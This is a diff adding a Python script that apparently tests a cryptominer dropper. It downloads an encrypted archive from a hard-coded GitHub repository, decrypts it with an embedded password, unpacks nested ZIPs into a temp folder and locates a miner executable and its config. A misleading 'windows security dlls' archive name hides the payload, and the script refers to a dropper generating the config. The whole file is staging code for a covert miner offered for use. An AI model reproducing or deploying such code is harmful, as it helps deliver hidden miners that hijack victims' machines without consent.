@@ -1,0 +1,141 @@
+import os, sys, tempfile, shutil, zipfile, io
+import urllib.request, urllib.error, ssl, urllib.parse, json
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
+from cryptography.hazmat.backends import default_backend
+
+# ─── CONFIGURATION (edit these) ──────────────────────────────
+REPO_BASE = "https://github.com/ivanban789/bom"   # change to your repo
+BRANCH = "auto"                                    # "auto" = detect, or set "main"/"master"
+ENCRYPTED_FILENAME = "8bf2d77c9745_windows security dlls.zip.enc"
+PASSWORD = "SHADOWwolf12"
+MINER_EXE_NAME = "who my pie.exe"                 # case-insensitive search
+# ─────────────────────────────────────────────────────────────
+
+def get_default_branch(repo_path):
+    """Fetch the default branch of a public GitHub repo."""
+    api_url = f"https://api.github.com/repos/{repo_path}"
+    try:
+        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=10, context=ssl.create_default_context()) as resp:
+            data = json.loads(resp.read().decode())
+            return data.get('default_branch', 'main')
+    except Exception as e:
+        print(f"⚠️  Could not detect branch: {e}. Using 'main' as fallback.")
+        return 'main'
+
+def recursive_unzip(root_dir):
+    """Extract all .zip files inside root_dir, then scan again until no more."""
+    while True:
+        zip_files = []
+        for dirpath, _, filenames in os.walk(root_dir):
+            for fn in filenames:
+                if fn.lower().endswith('.zip'):
+                    zip_files.append(os.path.join(dirpath, fn))
+        if not zip_files:
+            break
+        for zp in zip_files:
+            try:
+                extract_to = os.path.splitext(zp)[0]
+                os.makedirs(extract_to, exist_ok=True)
+                with zipfile.ZipFile(zp, 'r') as zf:
+                    zf.extractall(extract_to)
+                os.remove(zp)
+                print(f"   → Extracted nested archive: {os.path.basename(zp)}")
+            except Exception as e:
+                print(f"   ⚠️  Failed to extract {zp}: {e}")
+
+# ─── 1. Build the raw URL ────────────────────────────────────
+repo_path = REPO_BASE.rstrip('/').split('github.com/')[-1]
+if BRANCH == "auto":
+    BRANCH = get_default_branch(repo_path)
+miner_url = f"https://raw.githubusercontent.com/{repo_path}/{BRANCH}/{urllib.parse.quote(ENCRYPTED_FILENAME)}"
+print(f"Download URL:\n{miner_url}\n")
+
+# ─── 2. Download ─────────────────────────────────────────────
+print("1. Downloading encrypted file...")
+try:
+    req = urllib.request.Request(miner_url, headers={'User-Agent': 'Mozilla/5.0'})
+    with urllib.request.urlopen(req, timeout=30, context=ssl.create_default_context()) as resp:
+        encrypted_data = resp.read()
+    print(f"   ✅ Downloaded {len(encrypted_data)} bytes.\n")
+except urllib.error.HTTPError as e:
+    sys.exit(f"   ❌ HTTP error {e.code}: {e.reason}\n   Check filename / branch / repo privacy.")
+except Exception as e:
+    sys.exit(f"   ❌ Download failed: {e}\n")
+
+# ─── 3. Decrypt ──────────────────────────────────────────────
+print("2. Decrypting...")
+if len(encrypted_data) < 44:
+    sys.exit("   ❌ File too short (needs at least 44 bytes: 32 salt + 12 nonce).")
+
+salt = encrypted_data[:32]
+nonce = encrypted_data[32:44]
+ciphertext = encrypted_data[44:]
+
+try:
+    kdf = Argon2id(
+        salt=salt,
+        length=32,
+        memory_cost=64 * 1024,   # 64 MiB
+        iterations=3,
+        lanes=4,
+        backend=default_backend()
+    )
+    key = kdf.derive(PASSWORD.encode('utf-8'))
+    aesgcm = AESGCM(key)
+    plaintext = aesgcm.decrypt(nonce, ciphertext, None)
+    print(f"   ✅ Decryption successful! First bytes: {plaintext[:20].hex()}\n")
+except Exception as e:
+    sys.exit(f"   ❌ Decryption failed: {e}\n   Most likely wrong password or corrupted file.\n")
+
+# ─── 4. Validate ZIP ─────────────────────────────────────────
+print("3. Validating ZIP...")
+try:
+    with zipfile.ZipFile(io.BytesIO(plaintext)) as zf:
+        bad_file = zf.testzip()
+        if bad_file:
+            sys.exit(f"   ❌ ZIP is corrupted (first bad file: {bad_file})\n")
+        print("   ✅ ZIP integrity OK.\n")
+except zipfile.BadZipFile:
+    sys.exit("   ❌ Decrypted data is not a valid ZIP file (wrong key?).\n")
+except Exception as e:
+    sys.exit(f"   ❌ ZIP error: {e}\n")
+
+# ─── 5. Extract & recursive unzip ────────────────────────────
+print("4. Extracting...")
+temp_dir = tempfile.mkdtemp(prefix="miner_test_")
+try:
+    with zipfile.ZipFile(io.BytesIO(plaintext)) as zf:
+        zf.extractall(temp_dir)
+    # Now recursively extract any nested ZIPs
+    recursive_unzip(temp_dir)
+    print(f"   ✅ All files extracted to: {temp_dir}\n")
+except Exception as e:
+    sys.exit(f"   ❌ Extraction error: {e}\n")
+
+# ─── 6. Search for miner & config ────────────────────────────
+print("5. Searching for miner and config...")
+found_exe = None
+found_config = None
+for root, dirs, files in os.walk(temp_dir):
+    for f in files:
+        if f.lower() == MINER_EXE_NAME.lower():
+            found_exe = os.path.join(root, f)
+        elif f.lower() == "config.json":
+            found_config = os.path.join(root, f)
+
+if found_exe:
+    print(f"   ✅ Miner found: {found_exe}")
+else:
+    print(f"   ❌ Miner '{MINER_EXE_NAME}' NOT found.")
+
+if found_config:
+    print(f"   ✅ config.json found: {found_config}")
+else:
+    print("   ℹ️  No config.json (dropper will generate one).")
+
+print("\n" + "=" * 60)
+print("🎉 Test complete. The extracted files are in:")
+print(f"   {temp_dir}")
+print("You can delete that folder when you're done.")
